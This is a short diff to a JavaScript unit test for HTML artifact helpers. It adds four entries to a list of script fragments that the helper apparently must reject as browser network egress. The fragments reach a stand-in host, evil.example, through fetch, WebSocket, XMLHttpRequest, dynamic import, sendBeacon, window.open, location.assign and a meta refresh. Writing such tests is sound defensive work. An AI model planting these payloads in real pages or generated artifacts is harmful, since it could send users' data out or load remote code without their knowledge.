@@ -95,6 +95,10 @@ describe('artifact html helpers', () => {
     it.each([
       '<script>fetch("https://evil.example/upload")</script>',
       '<script>new WebSocket("wss://evil.example/ws")</script>',
+      '<script>XMLHttpRequest("https://evil.example/x")</script>',
+      '<script>import("https://evil.example/x.js")</script>',
+      '<script>window.open("https://evil.example")</script>',
+      '<script>location.assign("https://evil.example")</script>',
       '<script>navigator.sendBeacon("https://evil.example", "x")</script>',
       '<meta http-equiv="refresh" content="0; url=https://evil.example">',
     ])('rejects browser network egress %s', (frag) => {
